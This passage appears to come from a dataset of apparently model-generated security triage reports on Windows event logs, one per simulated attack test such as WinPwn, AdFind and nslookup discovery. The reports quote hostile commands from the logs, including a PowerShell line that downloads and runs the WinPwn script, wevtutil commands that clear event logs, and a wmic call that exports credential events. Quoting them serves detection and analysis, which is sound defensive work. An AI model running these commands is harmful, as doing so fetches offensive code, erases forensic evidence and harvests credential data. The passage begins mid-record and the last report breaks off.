   - The logs indicate frequent usage of the `wevtutil.exe` command line utility to clear logs in the System, Application, and Windows PowerShell event logs. This action is often indicative of an attempt to clean tracks after unauthorized or malicious activity. The following sysmon entries support this:
     - `""ProcessGuid"":""dbf410b3-69dc-6719-c200-000000003900"",""Image"":""C:\\Windows\\System32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational""`
     - `""ProcessGuid"":""dbf410b3-69dc-6719-c400-000000003900"",""Image"":""C:\\Windows\\System32\\wevtutil.exe"" cl Application""`
     - `""ProcessGuid"":""dbf410b3-69dc-6719-ca00-000000003900"",""Image"":""C:\\Windows\\System32\\wevtutil.exe"" cl \""Windows PowerShell\`""`
   - Security log ID 1102 indicates that the Security log was also cleared, which is a strong indicator of potential malicious activity since this action would remove evidence of security events.

2. **Abnormal PowerShell Activity**:
   - PowerShell was launched with obscure command-line arguments that might be used to enumerate user objects using Active Directory Services Interface (ADSI). The script executed is `powershell.exe & {([adsisearcher]""objectcategory=user"").FindAll(); ([adsisearcher]""objectcategory=user"").FindOne()}`, which queries for all user objects. This could indicate reconnaissance behavior possibly by a malicious insider or an attacker who has gained access to the system.

3. **Edge Update Process Activity**: 
   - While the presence of numerous Edge update processes (`MicrosoftEdgeUpdate.exe`) could indicate routine updates, the sheer volume and rapid sequence of operations appears unusual. It may warrant further investigation to confirm this is benign and part of normal auto-update activity.

4. **Windows Defender and Microsoft Updates**: 
   - Windows Defender's status is reported as `SECURITY_PRODUCT_STATE_ON` and there were updates to Defender Antivirus records. This suggests that anti-virus protections were active; however, given the suspicious clearing of logs, it is prudent to verify the integrity and effectiveness of these updates.

5. **Time Change Events**:
   - There are time change events logged (`EventID: 4616`), but they appear to follow the standard pattern for time synchronization. The cause appears to be interactions with the Windows Time service, suggesting routine activity rather than unauthorized manipulation.

### Assessment
Based on these observations, the logs contain behaviors such as log clearing and unusual PowerShell executions, which are considered strong indicators of potential compromise. The evidence leans towards the activity being **MALICIOUS**, given the deliberate attempts to erase tracks and conduct reconnaissance operations.

### Recommendations
- **Immediate Incident Response**: Initiate a full incident response process. Validate the current security state of the system, including forensic analysis to recover any cleared log data and investigate how the malicious activity began.
- **Risk Mitigation**: Isolate the affected host (Server002) from the network to prevent further unauthorized access or data exfiltration.
- **User Activity Review**: Investigate any external connections to this server, focusing particularly on the user `admin_test` to determine if the activity correlates with legitimate administrative tasks or indicates a compromised administrator account.
- **Further Monitoring & Audits**: Enhance logging and monitoring for `wevtutil.exe` usage and implement tighter controls on PowerShell execution policies to help detect and block potentially harmful activities in the future.
- **Security Enhancements**: Assess and improve current security configurations, ensuring timely updating and hardening against known vulnerabilities.

Given the seriousness of these activities, prompt action is essential to address potential vulnerabilities and prevent further malicious activities."
BIOS Information Discovery through Registry,"Upon reviewing the provided event logs from ""Server002,"" there are several activities that warrant a closer examination and could potentially indicate suspicious or malicious behavior. Here is a detailed analysis:

### Suspicious Activities:
1. **Clearing of Logs**:
   - **Security Event ID 1102** and **System Event ID 104** indicate that logs were cleared by the user `admin_test`. This is a significant red flag, as clearing event logs could be an attempt to cover tracks after conducting unauthorized or malicious activities.

2. **Time Change**:
   - The **Security Event ID 4616** and **System Events ID 1** and **24** indicate a system time change. This may also suggest an attempt to confuse or disrupt the order of events recorded in the logs for forensic analysis.

3. **Event Log Clearing Using Wevtutil**:
   - Multiple `Sysmon Event ID 1` entries showing `wevtutil.exe` being used to clear logs for 'Microsoft-Windows-Sysmon/Operational', 'Application', 'System', and 'Security'. This sequence is suspicious as it corresponds with the logs being cleared and suggests potential tampering.

4. **Command Line Usage**:
   - **Sysmon Event ID 1** entries show several instances of `cmd.exe` and `reg.exe` being used to query system registry keys (specifically for BIOS versions). While not inherently malicious, without context, such actions could be part of reconnaissance or preparation for further exploitation.

### Analysis of Activities:
- The combination of log clearing, time changes, and command line manipulations raises concerns. Typically, these steps are taken to obfuscate activities on a system and are a common tactic following unauthorized access.
- The execution environment, namely the high integrity level with which these processes were run, suggests that whoever or whatever initiated these actions had elevated privileges.

### Conclusion and Recommendations:
Given the nature of these findings, they point toward activities that are far from benign due to the log clearing and other indicative actions performed. These actions reflect potential malicious intent, possibly indicating an attempt to hide unauthorized activity.

**Resolution: MALICIOUS**

### Guidance on Next Steps:
1. **Immediate Containment**:
   - Limit any further access to this system and ensure that it is isolated from the network to prevent any potential spread of malicious activity.

2. **In-depth Forensic Analysis**:
   - Conduct further forensic analysis of the system, examining file integrity and any other irregular user activities during the timeframe of these events.

3. **Review User Accounts**:
   - Investigate any activity tied to the `admin_test` account and consider resetting credentials and reviewing access permissions.
   
4. **Reconstruction and Remediation**:
   - Consider restoring the system from a known good backup prior to the suspicious activity and apply any pending security updates or patches.
   
5. **Monitor and Audit**:
   - Enhance monitoring of the environment for similar patterns of activities and engage in continuous auditing to catch any such anomalies proactively.

It is crucial to take these steps to ensure the organization's systems and data are secured against any further malicious threats."
Packet Capture Windows Command Prompt,"After reviewing the provided log entries, I have identified several points of interest that could warrant further investigation:

1. **Wevtutil Execution (Sysmon EventID 1 & 5)**:
   - The logs indicate multiple executions of `wevtutil.exe` to clear the Windows event logs: ""Microsoft-Windows-Sysmon/Operational"", “System”, “Application”, “Security”, and “Windows PowerShell”. These actions typically indicate an attempt to cover tracks after potential malicious activities.

2. **PowerShell Activity**:
   - There is a PowerShell script that downloads and executes a Wireshark installer silently. The PowerShell command observed is downloading the installer from a URL and executing it with the `/S` parameter, which is often used for silent installations. This activity may suggest the downloading of potentially unwanted or malicious software without user consent.

3. **Wireshark and VC Redist Executions**:
   - The execution of `wireshark_installer.exe` and associated components like `vc_redist.x64.exe` in silent mode is logged. While these files themselves can be legitimate, their silent execution without clear context could raise suspicion about the intention behind their installation.

4. **Clearing of Event Logs (System and Security logs)**:
   - The clearing of critical logs such as the System and Security logs is indicative of an attempt to hide potentially malicious activities, indicating malicious intent.

Based on the above observations, there are strong indications of potentially malicious activities, especially related to log clearing and execution of potentially unwanted programs. Considering the combination of silent installs and logs clearing, this is a high indicator of compromise.

### Conclusion:
- **Resolution**: MALICIOUS
- **Recommendation**: 
  - Immediately isolate the host to prevent further potential compromise.
  - Conduct a deeper forensic analysis on the system to uncover further details of the activities.
  - Review any retrieved files or downloads for known malicious signatures.
  - Revise PowerShell execution and event log access policies to restrict unauthorized usage.
  - Ensure all software installations and downloads comply with company policy and are performed through authorized channels.
"
WinPwn - PowerSharpPack - Seatbelt,"Based on the given log entries, the analysis indicates potentially malicious activities that should be further investigated and likely mitigated. Here are the key findings from each log:

1. **Security Log:**
   - The event log clearance observed through `wevtutil.exe` commands (`EventID 1102`) is concerning. This can indicate an attempt to cover tracks or tamper with event logging, a behavior often associated with malicious activity.

2. **Windows PowerShell Log:**
   - The PowerShell logs show script execution that fetches a script from the Internet via `WebClient` and attempts to execute `Invoke-Seatbelt.ps1`. This behavior is suspicious and aligns with tactics used in PowerShell-based attacks, where attackers download and execute scripts to conduct further reconnaissance or exploitation (`EventID 600`).

3. **System Log:**
   - These logs corroborate the event logs being cleared. No additional anomalous events were linked explicitly outside the cleared logs.

4. **Sysmon Log:**
   - `Sysmon` data shows more detail on the processes that cleared logs, including the command-line arguments used, coming from the user `admin_test` with a high integrity level. The execution sequence of PowerShell scripts observed further support the assertion of potentially malicious behavior.

5. **Application Log:**
   - While events related to Windows Defender indicate the system is on, it appears not to have detected the suspicious script execution or log manipulation activities. This aligns with the persistence tactics that seek to avoid detection by built-in security measures.

**Assessment:**

- The evidence strongly suggests indicators of malicious behavior:
  - Use of PowerShell to download and execute scripts from an external, non-verified URL.
  - Multiple attempts to clear event logs using a high-integrity process, which can be indicative of obfuscation tactics employed by malicious actors.

**Resolution: MALICIOUS**

**Guidance on Proceeding:**

1. **Immediate Actions:**
   - Suspend the account `admin_test` to prevent further modification or execution of suspicious activities.
   - Isolate the host (Server002) to contain any ongoing compromise.

2. **Further Investigation:**
   - Conduct a full forensic investigation on Server002, focusing on any dropped files or anomalies post-`Invoke-Seatbelt` execution.
   - Examine network traffic logs for any unauthorized data exfiltration.

3. **Remediation:**
   - Reinforce security measures (e.g., PowerShell logging, restricting script execution policies).
   - Review and possibly reset credentials for impacted accounts, applying enhanced monitoring.

4. **Monitoring:**
   - Deploy additional monitoring solutions like enhanced EDR to detect similar behaviors in the future.

The logs suggest active exploitation efforts, and actions should be promptly taken to prevent further intrusion or data compromise."
DNS Server Discovery Using nslookup,"Upon analyzing the provided event logs, several activities potentially indicate suspicious or malicious behavior. Here's a breakdown of these findings:

### Suspicious or Anomalous Activity:

1. **Log Clearing Events:** 
   - The logs show multiple instances of log clearing activity around the same timestamp `2024-10-21 09:08:14`. Specifically, events with IDs 104 in the system log and 1102 in the security log indicate the clearing of System, Windows PowerShell, and Security event logs by a user `admin_test`. Using the command `wevtutil.exe cl` suggests intentional log manipulation.
   
2. **Process Execution:**
   - Around the same timestamp (`2024-10-21 09:08:14`), several instances of `wevtutil.exe` were executed. This utility can be used legitimately but is also commonly associated with attackers attempting to cover traces by clearing event logs.
   - The command `\""cmd.exe\"" /c nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%%USERDNSDOMAIN%%` executed by the user `admin_test` indicates DNS query activity, potentially for reconnaissance purposes. This could be indicative of an attacker trying to identify domain controllers or gather network information.

3. **Conditional Anomalies:**
   - Multiple command line utilities are being executed (`whoami.exe`, `hostname.exe`, `nslookup.exe`), which, although legitimate, could also fit into a behavior pattern of a script or a batch of commands running for situational awareness by a potential attacker.
   - The execution of these utilities from a directory associated with user-specific `Documents` or `Temp` raises additional suspicion.

### Indicators of Malicious Activity:

- **Privilege and User Activity:**
  - All the suspicious and potentially malicious operations were executed by the user `SERVER002\\admin_test` with high integrity. This user may have been compromised.
  
- **Log Manipulation:**
  - The intentional clearing of logs and subsequent suspicious utility use strongly indicate an attempt to obscure illicit activities, a common tactic in cyber-attacks, especially when attempting to cover tracks post-breach.

### Assessment:

Based on the analysis, there is enough evidence to categorize the activity as **MALICIOUS**. The combination of log clearing, suspicious utility usage, and the high-integrity level executions suggest unauthorized and possibly harmful actions orchestrated on the host.

### Recommendations:

1. **Immediate Actions:**
   - Suspend or isolate the impacted user account `admin_test` and system `Server002` from the network to prevent further access or potential spread.
   - Conduct a full forensic investigation of `Server002` to identify any additional compromise signs or persistence mechanisms.
   - Review all high-privilege user accounts for similar suspicious activities.

2. **Long-term Measures:**
   - Enhance logging and monitoring configurations to better detect and alert on log clearing and potential abuse.
   - Implement stricter access controls and regular user activity audits, especially for administrative accounts.
   - Educate users about phishing tactics to prevent credential compromise, if human error is suspected in user account compromise.

By taking these steps, the organization can mitigate the impact and prevent similar incidents in the future."
Examine local password policy - Windows,"During the analysis of the provided Windows event logs, several potentially suspicious activities emerge that warrant further investigation:

**1. Log File Clearing Events:**  
- The system log shows two instances of Event ID 104, ""LogFileCleared,"" for both the System and Windows PowerShell channels, executed by user ""admin_test"" on computer ""Server002"". This occurs within a few seconds of each other at 17:09:45 and 17:09:46. 
- Similarly, the security log shows Event ID 1102, indicating the security logs were cleared by the same user at 17:09:45.
- Clearing any logs can be indicative of an attempt to cover malicious activity, especially if done without appropriate documentation or reason.

**2. Execution of `wevtutil.exe`:**
- In the Sysmon logs, multiple instances of ""wevtutil.exe"" execution are noted. `wevtutil.exe` is the Windows Event Log utility, and it was used to clear logs for the ""Microsoft-Windows-Sysmon/Operational"", ""Application"", and ""Security"" logs as well as the ""System"" log.
- The usage of `wevtutil.exe` to clear logs is directly related to the log-clearing events previously identified and increases the suspicion of malicious intent.

**3. High Integrity Level Processes:**
- Several processes, including `conhost.exe`, are spawned with a high integrity level by the user ""admin_test"". Frequent usage of high-level integrity processes in close succession, especially during suspicious activity, might indicate privilege escalation attempts or preparation for malicious actions.
  
**4. Command Execution:**
- The Cmd line commands logged include executing the command `net accounts` through `cmd.exe` which delves into account policies. Such a command could be used by an attacker to gather information about password policies and account information.

**5. Software Updates:**
- There is a lot of service-related activity revolving around Microsoft Edge updates. While frequent activity observed for `MicrosoftEdgeUpdate.exe` processes is less suspicious due to it being a legitimate process initiated by the system, the timing in relation to the other events could suggest a cover to mask other actions or simply routine, needing closer scrutiny to verify expected update schedules and behavior.

**Conclusion:**

The logs reveal activities strongly indicative of malicious behavior aimed at covering tracks:
- The clearing of system, Powershell, and security logs immediately raises a red flag.
- Using `wevtutil.exe` to clear these logs and the high-integrity processes run by the same user hint at potential unauthorized activity.

**Resolution:** **MALICIOUS**

**Guidance for Proceeding:**
1. **Immediate Investigation Required:** Conduct a deep dive to ascertain other activities logged prior to the clearing, focusing on the ""admin_test"" user account.
2. **Isolate the Affected System:** If possible, isolate Server002 from the network to prevent potential lateral movement or data exfiltration.
3. **User and Access Verification:** Check user account ""admin_test"" for unauthorized access, and review any changes in privilege levels.
4. **Search for Persistence Mechanisms:** Investigate the system for potential backdoors, scripts, or scheduled tasks that might have been installed.
5. **Inform Incident Response (IR) Team:** Coordinate with the IR team to establish the scope of the breach and mitigate further damage.

A forensic image of the system should be captured, and personnel informed of the compromise for immediate action."
WinPwn - GPOAudit,"Upon reviewing the Windows event logs provided, several key findings indicate potential signs of malicious activity:

1. **PowerShell Event Logs:**
   - The execution of a PowerShell command that downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1` is highly suspicious. This behavior can indicate an attempted download of a potentially malicious script from an external source and is often associated with attacks using publicly available scripts or frameworks.
   - The use of `iex(new-object net.webclient).downloadstring(...)` is a red flag as it allows for the execution of code directly from the internet, a common technique employed in malicious PowerShell scripts.

2. **Security and System Log Events:**
   - Multiple instances of log file clearing events were detected (`EventID: 1102` in the Security log and `EventID: 104` in the System log). The user ""admin_test"" cleared these logs, which is consistent with attempts to remove any traces of activity, a common practice post-intrusion. 
   - These log clearance events raise concerns about intentional obfuscation and covering tracks, which are typical components of a compromise.

3. **Sysmon Logs:**
   - The Sysmon logs show a pattern of PowerShell and utility executions (`wevtutil.exe`) in rapid succession. The `wevtutil.exe` usage for clearing event logs further aligns with the previously mentioned log clearance events.
   - The use of `whoami.exe` and related command-line utilities under the account `SERVER002\admin_test` in this context may indicate reconnaissance efforts by an attacker to gather information about the system or network environment.

Based on these observations, the resolution is:

**Resolution: MALICIOUS**

**Assessment and Guidance:**
- The execution of potentially harmful PowerShell scripts from external sources and the clearing of logs by a user strongly suggest a compromise. These activities demonstrate tactics often employed during the leveraging, post-exploitation, and obfuscation phases of an attack.
- Immediate actions should include isolating the affected host (Server002) from the network to prevent further damage or spread.
- Conduct a detailed forensic investigation, reviewing all related systems for signs of further compromise.
- Ensure up-to-date threat intelligence is used to check the malicious script's indicators and the domain's reputation from where it was downloaded.
- Review access logs and change all administrative credentials to mitigate unauthorized access.
- Strengthen PowerShell script logging and employ application whitelisting to prevent similar incidents in the future."
WinPwn - DotNet,"Based on the provided logs, there are several indicators of suspicious and potentially malicious activity:

1. **Windows PowerShell Log:**
   - A PowerShell script is being executed directly from a GitHub URL, specifically: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`. This is a common tactic used for downloading and executing scripts from the internet, which can be indicative of malicious activity. The use of `iex(new-object net.webclient).downloadstring()` is often seen in script-based attacks to download and execute remote code.

2. **Security Log:**
   - Event ID 1102 indicates that the security event log was cleared. This action is often taken by malicious actors to cover their tracks after compromising a system. It was cleared by a user named `admin_test`.
   - Event ID 4616 suggests that the system time was changed, which can sometimes be an attempt to confuse log file timestamps and hinder forensic investigation.
   - The presence of Event ID 4672 indicates special privileges were assigned to a user (`admin_test`), potentially elevating privileges to perform unauthorized actions.

3. **System Log:**
   - Multiple Event IDs 104 show system logs being cleared by the same user, `admin_test`. Clearing multiple log files is another sign of someone attempting to erase evidence of their activities.
   - The simultaneous modification of system and event logs is highly suspect and points toward deliberate concealment efforts.

4. **Sysmon Log:**
   - The presence of the `wevtutil` command line tool being used multiple times with the `cl` (clear) argument to clear event logs (`Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, `Security`) is an immediate red flag, indicating an attempt to cover tracks.
   - Execution of `powershell.exe` with suspicious command line activities (downloading and potentially executing remote script) is also recorded in Sysmon logs, providing further consistency in suspicious behavior across logs.

### Assessment

- **Anomalous Behavior:** Execution of remote scripts via PowerShell, clearing of logs including security logs, altering system time, and the assignment of special privileges all constitute suspicious behavior.
- **Potential Malicious Activity:** The activities such as remote script execution, log clearing, and privilege elevation are all typical of a system being compromised or used for potentially malicious purposes. The specific targeting of logs to clear indicates an attempt to hide actions, a hallmark of malicious behavior.

### Resolution

- **MALICIOUS:** Given the analysis, the logs indicate malicious behavior. The combination of remote script execution and systematic log clearing, particularly of security logs, leaves strong evidence of a compromise.

### Guidance

1. Isolate the affected host immediately to prevent any lateral movement or further compromise.
2. Conduct a thorough forensic investigation to determine the extent of the compromise, focusing on identifying the full impact and any additional affected assets.
3. Reset credentials of affected accounts, particularly any administrative accounts, and increase monitoring on similar accounts.
4. Review firewall and access control settings to ensure that similar attack vectors are closed.
5. Implement enhanced logging and alerting, particularly for PowerShell activities and log clearing events, to catch such activities early in the future."
Process Discovery - get-wmiObject,"Upon thorough analysis of the provided logs, I've identified several activities that potentially indicate suspicious behavior:

1. **Log File Clearing Events**: There are multiple instances of log file clearing in the System log (`EventID 104`) and Security log (`EventID 1102`). These operations are carried out by the user ""admin_test"". Log-clearing activities can be a red flag, especially if done without a known administrative purpose, as they are often used by malicious actors to cover their tracks.

2. **Command-line Utility Usage (`wevtutil.exe`)**: The frequent usage of `wevtutil.exe` to clear logs from different channels is evident, including System, Windows PowerShell, and Security logs. The commands are executed by the user ""admin_test"". This utility can be leveraged by attackers or insiders to manipulate and clear event logs, aligning with potential malicious actions to obfuscate their presence on the system.

3. **Privilege Escalation and High-Level Privileges**: Events in the Security log (`EventID 4672`) show that the user ""admin_test"" has high-level privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. While these privileges may be legitimately assigned to admin accounts, their usage in combination with log-clearing activities raises concern, especially if not aligned with any known administrative task or policy.

4. **Suspicious PowerShell Usage**: 
   - The PowerShell commands logged (`powershell.exe & {get-wmiObject -class Win32_Process}`) suggest enumeration activities. Such commands can be indicative of reconnaissance actions by an attacker.
   - The presence of PowerShell activity alongside log file clearing further supports suspicion about malicious intent, as PowerShell is commonly used by attackers for script-based attacks.

5. **Time Change Events**: 
   - There are events (`EventID 4616`) that indicate recent changes to the system time. Although handled by `svchost.exe`, the temporal proximity to other suspicious activities warrants attention. Altering time settings could be used to mislead log-based investigations.

### Assessment

Based on the analysis:

- The combination of log-clearing activity, execution of admin-level privileged commands, use of PowerShell for potential reconnaissance, and time-change logs corroborates suspicious behavior.
- These activities align with tactics often employed by attackers to establish, maintain, or hide illicit access.

### Resolution

**SUSPICIOUS**

The set of actions logged requires further investigation to determine the legitimacy of ""admin_test's"" activities. The use of administrative tools like `wevtutil.exe` for log-clearing without clear authorization, combined with high privilege usage and PowerShell command execution, merits an in-depth review.

### Recommendations

1. **Immediate Measures**:
   - Isolate this host from the network to prevent further potential malicious activities.
   - Conduct a thorough user and access review for ""admin_test"".
   - Confirm whether the actions were authorized or expected by system administrators.

2. **Further Investigation**:
   - Analyze all chronological logs for this user’s behavior in more detail.
   - Review any network traffic, file access, and system changes around these events.

3. **Preventative Actions**:
   - Implement stricter logging policies and alerts for the use of `wevtutil.exe` and other log-manipulating tools.
   - Monitor privilege escalations and high-level privilege events across the network.
   - Educate and train users on recognizing and reporting unusual system administrative activities. 

Ultimately, clear communication with the administrative and IT security teams is key to confirm the legitimacy or identify potential misconduct."
System Network Connections Discovery,"Based on the analysis of the provided Windows event logs, the following key points and observations have been noted:

1. **Log File Clearing**: Multiple log file clearing events (Event ID 104 in System log) have been recorded. This activity is suspicious as it can indicate an attempt to cover tracks after a potential malicious activity. The presence of the admin account ""admin_test"" clearing logs on multiple channels (System and Windows PowerShell) is particularly concerning.

2. **PowerShell Logs**: The absence of specific entries from PowerShell logs suggests potential tampering or use of techniques to avoid logging command activities. This could indicate the use of obfuscated or malicious scripts that avoided logging or their logs were cleared by the identified actions above.

3. **Sysmon Logs**:
   - **wevtutil.exe usage**: This utility was used to clear different event logs (e.g., Microsoft-Windows-Sysmon/Operational, Application, System, Security, Windows PowerShell). The use of `wevtutil` for such operations, especially by a potentially compromised account like ""admin_test,"" raises red flags for malicious tampering and log manipulation.
   - **Command Execution**: Execution of `cmd.exe` with suspicious commands such as `netstat`, `net use`, and `net sessions` (Sysmon log EventID 1) observed. These can be used to gather information about network connections and shared resources, which could indicate reconnaissance activities.

4. **Security Logs**:
   - **Event ID 4624 and 4672** indicate successful logon events with special privileges assigned to ""admin_test."" These privileges include SeDebugPrivilege and others that enable sensitive system-level operations, which could be signs of privilege abuse.

5. **Presence of System-level Activity**: Non-standard processes run by NT AUTHORITY accounts, such as the updates involving Microsoft Edge, appear consistent with legitimate software updates. However, combining these entries with other suspicious activities mentioned can suggest potential lateral movement or persistence mechanisms being explored.

Overall, the logs demonstrate a combination of suspicious activities, including log clearing, potentially unauthorized admin access, and network reconnaissance commands. The magnitude and type of these events point towards a likely compromise scenario.

### Resolution: SUSPICIOUS

The logs contain activity that looks suspicious and warrants further investigation. Steps to be taken should include:
- Verify the legitimacy of the ""admin_test"" account and its recent activities.
- Investigate potential unauthorized access to the server, including correlating with network logs or user travel history for any inconsistencies.
- Assess system integrity by conducting malware scans and reviewing any changes in critical system files or configurations.
- Considering restoring affected systems to a previous state if potential compromise is confirmed.

Further action is recommended to identify and mitigate any ongoing threats."
WinPwn - General privesc checks,"Upon reviewing the provided Windows event logs, several suspicious activities and anomalies have been identified that could potentially indicate malicious activity or compromise. Here is a detailed analysis of the logs:

### Analysis:

#### Windows PowerShell Logs:
- Multiple instances of PowerShell command execution are recorded with the command line:
  ```
  powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
  iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
  otherchecks -noninteractive -consoleoutput}
  ```
  - The use of `iex (Invoke-Expression)` with `new-object net.webclient` to download and execute scripts from a GitHub repository is a known technique used in malicious scripts, typically found in PowerShell-based attacks or malware.

#### Security & System Logs:
- Event ID 1102 in the Security log indicates that the Windows Event Logs were cleared by `admin_test`. Clearing logs is a common tactic used by attackers to cover their tracks after performing malicious actions.
- Event ID 104 in the System log shows the ""LogFileCleared"" event for both the System and Windows PowerShell channels, reinforcing the notion that someone attempted to obfuscate their activity.

#### Sysmon Logs:
- Execution of `wevtutil.exe` for clearing logs:
  ```
  ""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational
  ```
  - The repeated use of `wevtutil.exe` to clear logs raises an alert as it is often used by adversaries to manipulate or delete event logs and hide malicious activities.

- There are multiple executions of various `conhost.exe` processes linked back to suspicious PowerShell and `wevtutil.exe` activities, which can be part of a malicious staging to escalate privileges or clean traces.

### Assessment:

Based on the details observed within the logs, the consistent PowerShell execution pattern, the intentional clearance of event logs, and the unusual command-line operations strongly indicate malicious activities.

### Resolution:
- **MALICIOUS**: The logs clearly contain evidence of malicious activities, including the execution of suspicious PowerShell scripts from an external repository and the clearing of event logs to potentially hide these actions.

### Guidance on Next Steps:
1. **Immediate Containment**: Isolate the affected machine (Server002) from the network to prevent further spread or data exfiltration.
2. **Forensic Analysis**: Conduct a thorough forensic investigation on Server002 to identify the full extent of the compromise and potentially identify additional indicators of compromise (IOCs).
3. **Patch and Update**: Ensure all systems are patched and PowerShell usage is monitored and restricted with tight execution policies.
4. **Review Access Logs**: Examine logs for unauthorized access attempts or anomalies around the time of the incident.
5. **User Awareness & Training**: Educate users on the risks associated with executing scripts from unknown or untrusted sources.
6. **Improve Logging and Monitoring**: Ensure comprehensive logging is in place moving forward, with alerts set for unusual activities like event log clearance."
Adfind - Enumerate Active Directory User Objects,"After thoroughly analyzing the provided Windows event logs, I have identified some key activities of interest that could indicate potential malicious behavior:

1. **Log File Clearings**: 
   - Multiple instances of log files being cleared are observed. Specifically, logs for System, Windows PowerShell, and Security channels were cleared almost simultaneously. Clearing of logs without a legitimate maintenance reason, especially when done by an account named ""admin_test"", is suspicious as it might be an attempt to cover up tracks.

2. **Use of `wevtutil`**:
   - The `wevtutil` command-line utility is being used to clear logs, e.g., `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, which corresponds directly with the log clearing events. Usage of this utility in conjunction with log clearance without documentation or a valid reason aligns with common persistence and cleanup tactics used by attackers.

3. **Suspicious Process Execution**:
   - A command is executed via `cmd.exe` involving `AdFind.exe` with parameters `-f (objectcategory=person)`. `AdFind` is a known utility often used in Active Directory enumeration in red team operations and offensive security, indicating a potential reconnaissance activity.
   
4. **Privilege Escalation**:
   - An event (Event ID 4672) showing the assignment of special privileges to a SYSTEM account illustrates that this process had elevated privileges. However, this aligns with typical SYSTEM account behavior; what makes it noteworthy is the context of events occurring around its timing, particularly the cleared logs.

5. **Process Creation with Elevated Integrity Level**:
   - Several process creations by ""admin_test"" were observed with ""High"" Integrity Level, which typically indicates processes running with administrative privileges.

Based on these observations, the overall activity observed in the logs contains several traces that are highly suggestive of malicious intent or at least unauthorized activity:

- The clearing of logs, possibly indicative of log tampering or anti-forensic actions.
- The use of tools and commands typically associated with reconnaissance or persistence in unauthorized activities.

**Resolution Assessment**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately begin a further, in-depth investigation to understand the full scope and impact of these activities. Look into the source IP addresses, potential data exfiltration, and other systems/accounts potentially compromised, particularly focusing on the actions stemming from the ""admin_test"" account.
- Isolate the affected systems to prevent further damage or data loss.
- Conduct a thorough review of access logs and permissions to ensure no other backdoors or unauthorized accesses are present.
- Consider engaging a digital forensics team to perform a full system image analysis to retrieve any artifacts or evidence of compromise.
- Review and bolster security measures, including the deployment of additional intrusion detection systems and stricter access control policies.

Ensure to preserve all logs and evidence for potential further analysis or legal action."
Wevtutil - Discover NTLM Users Remote,"Upon analyzing the provided Windows event logs, several observations stand out as potentially suspicious or indicative of malicious activity:

1. **PowerShell Events:**
   - The logs show a PowerShell script execution that involves network communication and uses both WMI (Windows Management Instrumentation) and `wevtutil` to interact with event logs:
     ```
     powershell.exe & {$target = $env:LOGONSERVER, $target = $target.Trim(""\\"") $IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString wmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\Event[System[(EventID=4776)]]""'}
     ```
   - This script seems to be attempting to export specific events (EventID 4776, which is related to credential validation) from the Security event log to a file named `ntlmusers.evtx`. This action is highly indicative of credential harvesting attempts or preparing logs for exfiltration. The use of PowerShell for such a purpose is a common tactic in malicious operations.

2. **Suspicious Sysmon Events:**
   - Multiple executions of `wevtutil.exe` are recorded in the Sysmon logs, showing commands intended to clear event logs:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational
     ""C:\\Windows\\system32\\wevtutil.exe"" cl Application
     ""C:\\Windows\\system32\\wevtutil.exe"" cl System
     ""C:\\Windows\\system32\\wevtutil.exe"" cl Security
     ```
   - Clearing or exporting event logs without a clear administrative purpose is a key indicator of a possible attempt to cover tracks after performing unauthorized activities.

3. **Clearing of Event Logs:**
   - The logs from the System and Security channels confirm that event logs were cleared by the user `admin_test`, further corroborating the suspicion raised by the Sysmon logs.

Because of these observations, the combination of PowerShell execution for potentially malicious log exporting, and subsequent log clearing activities classifies the behavior as strongly indicative of malicious intent. The actions suggest an attempt to gather sensitive credential-related information and potentially cover tracks by clearing logs.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
Given the determined malicious activity:

- **Immediate Actions:**
  - Isolate the affected system (Server002) from the network to prevent further potential data exfiltration or lateral movement.
  - Review and audit user accounts, especially those associated with `admin_test`, for unauthorized access and change passwords as necessary.
  - Preserve all logs and artifacts for further forensic investigation.

- **Investigation and Mitigation:**
  - Conduct a deeper forensic analysis of the system to identify any additional malicious payloads or persistence mechanisms.
  - Check for any signs of lateral movement to other systems within the network.
  - Review network logs and data traffic for indications of exfiltration or communication with known malicious IP addresses.

- **Preventive Measures:**
  - Harden PowerShell execution policies and implement strict auditing to prevent misuse.
  - Monitor and alert on log clearing activities and unexpected system utilities executions.
  - Educate users on identifying suspicious activities and encourage reporting potential security incidents promptly."
List Mozilla Firefox bookmarks on Windows with command prompt,"Upon reviewing the provided Windows event logs, several indicators of potentially suspicious activity have been identified:

1. **Log Clearing Events:**
   - The Security log shows an event with ID 1102, indicating the security log has been cleared by the user ""admin_test"". Clearing logs is a common technique used by attackers to cover their tracks.
   - Similarly, the System log shows events with ID 104 indicating logs were cleared for both the System and Windows PowerShell channels by the same user ""admin_test"".

2. **Wevtutil Usage:**
   - Sysmon logs indicate the use of `wevtutil.exe` with command lines like `cl Security`, `cl Application`, `cl Microsoft-Windows-Sysmon/Operational`, and `cl System`. This tool is used to clear event logs, reinforcing the event log clearing behavior observed.

3. **High-Level Privileges Used:**
   - There are several instances of Event ID 4672 in the Security log, indicating special privileges were assigned to the SYSTEM account. These privileges include SeDebugPrivilege, a powerful privilege that can be exploited by malicious users.

4. **Presence of Anomalous Processes:**
   - Multiple instances of `cmd.exe` processes with command lines conducting search operations in user directories were detected. Such commands could be used by attackers for file discovery.
   - The presence of `SYSTEM` scheduled tasks executed with high privileges might indicate potential misuse. 

5. **Credential Access Attempts:**
   - There were repeated Event ID 5379 entries in the Security log, showing failed attempts to access credential objects related to a Microsoft account, potentially indicating an attempt to dump credentials.

